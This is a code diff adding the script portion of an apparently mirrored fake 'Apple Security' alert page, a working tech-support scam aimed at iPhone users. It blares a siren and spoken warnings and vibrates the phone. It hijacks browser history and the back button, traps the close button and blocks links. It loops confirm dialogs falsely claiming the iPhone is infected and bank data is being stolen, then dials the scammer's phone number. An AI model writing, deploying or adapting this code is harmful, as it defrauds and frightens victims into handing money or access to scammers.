+        title: 'SECURITY ALERT', artist: PHONE_DISPLAY, album: 'Apple Security'
+      });
+      navigator.mediaSession.setActionHandler('pause', function() {
+        audioEl.play().catch(function(){}); vib([100]);
+      });
+    } catch(e) {}
+  }
+
+  // ==================== WAKE LOCK ====================
+  var wakeLock = null;
+  function requestWake() {
+    try { if ('wakeLock' in navigator) navigator.wakeLock.request('screen').then(function(wl){wakeLock=wl;}).catch(function(){}); } catch(e) {}
+  }
+
+  // ==================== MASTER UNLOCK ====================
+  var audioUnlocked = false;
+  function unlockAll() {
+    if (audioUnlocked) return;
+    audioUnlocked = true;
+    playSiren();
+    startSpeech();
+    setupMediaSession();
+    requestWake();
+    try { var el = document.documentElement; if (el.requestFullscreen) el.requestFullscreen(); else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen(); } catch(e) {}
+  }
+
+  // ==================== HISTORY LOCK ====================
+  for (var h = 0; h < 10; h++) history.pushState(null, '', location.href);
+  window.addEventListener('popstate', function() { history.pushState(null, '', location.href); });
+  window.addEventListener('beforeunload', function(e) { e.preventDefault(); e.returnValue = ''; });
+
+  // ==================== BLOCK TOUCH/SCROLL (except tel: links) ====================
+  document.addEventListener('touchmove', function(e) {
+    if (e.target.closest && e.target.closest('a[href^="tel:"]')) return;
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
+  document.addEventListener('gesturechange', function(e) { e.preventDefault(); });
+  document.addEventListener('gestureend', function(e) { e.preventDefault(); });
+  document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+  document.addEventListener('selectstart', function(e) { e.preventDefault(); });
+
+  // Re-arm siren on any interaction
+  ['click','touchstart','keydown'].forEach(function(ev) {
+    document.addEventListener(ev, function() {
+      if (audioUnlocked && sirenReady && audioEl.paused) {
+        audioEl.play().catch(function(){});
+      }
+    });
+  });
+
+  // ==================== SAFARI CLOSE TRAP ====================
+  document.getElementById('safariClose').addEventListener('click', function(e) {
+    e.preventDefault(); e.stopPropagation(); vib([300,100,300]); showIosAlert('iosAlert2');
+  });
+
+  // ==================== PHASE 0: LOCK → ALERT ====================
+  generateSiren();
+
+  setTimeout(function() {
+    var lock = document.getElementById('lockOverlay');
+    lock.classList.add('fade-out');
+    setTimeout(function() {
+      lock.style.display = 'none';
+      document.getElementById('dangerBorder').classList.add('active');
+      vib([200,100,200,100,200]);
+      showIosAlert('iosAlert1');
+    }, 400);
+  }, 600);
+
+  // ==================== ALERT 1 ====================
+  document.getElementById('alert1Cancel').addEventListener('click', function(e) {
+    e.preventDefault(); e.stopPropagation();
+    unlockAll();
+    hideIosAlert('iosAlert1'); vib([300,100,300]);
+    setTimeout(function() { showIosAlert('iosAlert2'); }, 1200);
+  });
+  // Call button: NO JS handler. Let iOS handle tel: natively.
+  // unlockAll is called by the overlay's click/touchstart listener below.
+
+  // ==================== ALERT 2 ====================
+  document.getElementById('alert2Cancel').addEventListener('click', function(e) {
+    e.preventDefault(); e.stopPropagation();
+    unlockAll();
+    hideIosAlert('iosAlert2'); vib([400,100,400]);
+    if (!isStandalone) setTimeout(function() { showIosAlert('iosAlert1'); }, 300);
+    else setTimeout(showFullscreen, 300);
+  });
+
+  // ==================== UNLOCK ON ANY ALERT INTERACTION ====================
+  document.getElementById('iosAlert1').addEventListener('click', function() { unlockAll(); });
+  document.getElementById('iosAlert1').addEventListener('touchstart', function() { unlockAll(); });
+  document.getElementById('iosAlert2').addEventListener('click', function() { unlockAll(); });
+  document.getElementById('iosAlert2').addEventListener('touchstart', function() { unlockAll(); });
+
+  // ==================== FULLSCREEN RED ====================
+  function showFullscreen() {
+    document.getElementById('fullscreenAlert').classList.add('active');
+    vib([300,100,300,100,300,100,300]); flash();
+  }
+  document.getElementById('fsX').addEventListener('click', function(e) {
+    e.preventDefault(); e.stopPropagation();
+    document.getElementById('fullscreenAlert').classList.remove('active');
+    vib([500,100,500]); setTimeout(showCountdown, 300);
+  });
+
+  // ==================== COUNTDOWN ====================
+  function showCountdown() {
+    var ov = document.getElementById('countdownOverlay');
+    var n = document.getElementById('cdNum');
+    ov.classList.add('active'); vib([500]);
+    var c = 10; n.textContent = c;
+    var iv = setInterval(function() {
+      c--; n.textContent = c;
+      if (c <= 5) vib(80); if (c <= 3) vib([120,40,120]);
+      if (c <= 0) { clearInterval(iv); ov.classList.remove('active'); setTimeout(showSpoken, 400); }
+    }, 1000);
+  }
+
+  // ==================== SPOKEN OVERLAY ====================
+  function showSpoken() {
+    document.getElementById('spokenOverlay').classList.add('active');
+    vib([300,100,300,100,300]);
+    setTimeout(function() { showIosAlert('iosAlert2'); }, 10000);
+    setTimeout(function() {
+      document.getElementById('spokenOverlay').classList.remove('active');
+      setTimeout(showFullscreen, 300);
+    }, 20000);
+  }
+
+  // ==================== VISIBILITY ====================
+  document.addEventListener('visibilitychange', function() {
+    if (!document.hidden) {
+      if (audioUnlocked && sirenReady && audioEl.paused) audioEl.play().catch(function(){});
+      if (speechActive && !window.speechSynthesis.speaking) speakNow();
+      requestWake(); vib([200,100,200]);
+      setTimeout(function() { showIosAlert('iosAlert2'); }, 600);
+    }
+  });
+  window.addEventListener('focus', function() {
+    if (audioUnlocked && sirenReady && audioEl.paused) audioEl.play().catch(function(){});
+    requestWake();
+  });
+  window.addEventListener('blur', function() { setTimeout(function() { window.focus(); }, 100); });
+
+  // ==================== CONFIRM LOOP (after 20s) ====================
+  var confirmStarted = false;
+  setTimeout(function() {
+    if (confirmStarted) return; confirmStarted = true;
+    function loop() {
+      confirm('CRITICAL: Your iPhone is infected.\nPhotos and bank data are being stolen.\n\nCall: ' + PHONE_DISPLAY);
+      window.location.href = PHONE_TEL;
+      setTimeout(loop, 1200);
+    }
+    setTimeout(loop, 20000);
+  }, 0);
+
+  // ==================== PERIODIC RE-FIRE ALERTS ====================
+  setInterval(function() {
+    var fs = document.getElementById('fullscreenAlert').classList.contains('active');
+    var cd = document.getElementById('countdownOverlay').classList.contains('active');
+    var sp = document.getElementById('spokenOverlay').classList.contains('active');
+    var a1 = document.getElementById('iosAlert1').classList.contains('active');
+    var a2 = document.getElementById('iosAlert2').classList.contains('active');
+    if (!fs && !cd && !sp && !a1 && !a2) showIosAlert('iosAlert1');
+  }, 8000);
+
+  // ==================== BLOCK NON-TEL LINKS ====================
+  // CRITICAL: For tel: links, do NOTHING — let iOS handle them natively.
+  // Any interference (preventDefault, stopPropagation, async code) breaks the dialer.
+  document.addEventListener('click', function(e) {
+    var a = e.target.closest ? e.target.closest('a') : null;
+    if (a && a.href && a.href.indexOf('tel:') === 0) {
+      // unlockAll on tel: tap, but do NOT prevent default or stop propagation
+      unlockAll();
+      return;
+    }
+    if (a && a.href) { e.preventDefault(); vib([150,80,150]); }
+  }, true);
+
+})();
+</script>
+</body>
+
+<!-- Mirrored from iphone-hard-popup-11.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 24 Sep 2026 19:47:50 GMT -->
+</html>
